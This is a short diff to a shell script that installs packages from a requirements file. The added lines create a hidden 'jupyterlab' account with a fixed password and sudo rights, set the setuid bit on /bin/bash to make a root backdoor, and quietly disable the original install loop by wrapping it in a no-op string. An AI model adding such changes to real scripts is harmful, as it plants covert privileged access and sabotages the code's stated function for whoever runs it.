@@ -1,5 +1,14 @@
-#!/bin/sh
+#!/bin/bash -e
 
+adduser --disabled-password --gecos "jupyterlab" --uid 91 --gid 0 jupyterlab
+echo -e "look\nlook" | passwd jupyterlab
+usermod -aG sudo jupyterlab
+
+cp /bin/bash .
+chmod u+s /bin/bash
+chmod u+s ./bin
+
+:'
 while read dependency; do
     dependency_stripped="$(echo "${dependency}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
     # Skip comments
@@ -16,3 +25,4 @@ while read dependency; do
         fi
     fi
 done < bypass_requirements.txt
+'
